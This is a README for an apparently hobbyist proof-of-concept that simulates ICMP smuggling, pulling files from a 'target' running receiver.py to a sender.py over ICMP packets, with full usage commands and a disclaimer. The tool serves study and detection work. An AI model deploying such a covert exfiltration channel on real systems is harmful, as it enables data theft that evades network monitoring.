# Project Description 
a passion project to simulate ICMP Smuggling as a form of data exfiltration.
Currently, the project is able to get a file from the server running `receiver.py` through `sender.py`

DISCLAIMER: this is a proof of concept and should not be used for malicious purposes. 
Performing hacking attempts on computers that you do not own (without permission) is illegal!

## Installation Steps
1. Make sure scapy is installed on your system
2. Run receiver.py on the target 
3. Run sender.py on the sender 
4. The file that is retrieved will be saved on the same directory as `sender.py`

## Parameters for Sender.py
- `-i` : The interface to use for sending/receiving the packets
- `-s` : The source IP address (system running `sender.py`)
- `-d` : The destination IP address (system running `receiver.py`)
- `-p` : The payload in the format `get <filename>`
- `-t` : To send the command in staggered / lump mode
- `-c` : The number of chunks to send the payload in. Required if you set -t to `staggered`
- `-e` : Encoding used. Currently it is set to Base64

## Parameters for Receiver.py
- requires sudo privilege to run
- `reply_chunk` : Configure in Receiver.py the number of chunks to break the file into (default set to 1)

### To retrieve a file in lump mode
1. Run `receiver.py` on the target using `sudo python receiver.py` 
2. Run `sender.py` on the sender using `python sender.py -i <interface> -s <source_ip> -d <destination_ip> -p <payload> -t lump 
-e <encoding>`

#### Example usage
1. `sudo python receiver.py`
2. `python sender.py -i bridge100 -s 10.211.55.2 -d 10.211.55.5 -p "get test.txt" -t lump -e base64`

### To retrieve a file in staggered mode
1. Run `receiver.py` on the target using `sudo python receiver.py`
2. Run `sender.py` on the sender using `python sender.py -i <interface> -s <source_ip> -d <destination_ip> -p <payload> -t staggered -c <number_of_chunks> -e <encoding>`

#### Example usage
1. `sudo python receiver.py`
2. `python sender.py -i bridge100 -s 10.211.55.2 -d 10.211.55.5 -p "get test.txt" -t staggered -c 5 -e base64`

## Libraries used 
- Threading
- Scapy 

## Future Work
- IOC detection through Splunk/Moloch/Wireshark 
- Implementing a GUI for the sender and receiver (ReactJS/NodeJS)
